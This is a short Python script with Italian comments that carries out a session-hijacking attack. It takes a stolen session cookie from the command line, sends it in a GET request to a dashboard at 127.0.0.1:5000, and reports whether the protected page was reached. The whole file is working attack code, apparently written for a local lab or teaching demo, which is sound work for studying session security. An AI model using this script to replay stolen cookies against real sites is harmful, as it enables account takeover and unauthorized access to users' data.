import requests
import sys

# URL della dashboard
TARGET_URL = "http://127.0.0.1:5000/dashboard"

def session_hijacking_attack(session_cookie_value):
    print(f"\nSession Hijacking SU {TARGET_URL}")
    print(f"Cookie rubato: {session_cookie_value[:10]}...")
    
    # Costruiamo il cookie
    cookies = {
        'session': session_cookie_value
    }
    
    try:
        # Facciamo una richiesta GET diretta alla dashboard iniettando il cookie
        response = requests.get(TARGET_URL, cookies=cookies)
        
        # Se vediamo "Benvenuto", siamo dentro!
        if "Benvenuto nella tua area protetta" in response.text:
            print("\n\n>>> Successo, sessione dirottata!")
            print(f"Contenuto parziale pagina:\n{response.text[:150]}")
        else:
            print("\n\nFallito, Il cookie è scaduto o non valido.")
            print(f"Il server ci ha rimandato al login (Status: {response.status_code})")
            
    except Exception as e:
        print(f"\nErrore di connessione: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python attacco_sessione.py <VALORE_COOKIE_SESSION>")
    else:
        cookie = sys.argv[1]
        session_hijacking_attack(cookie)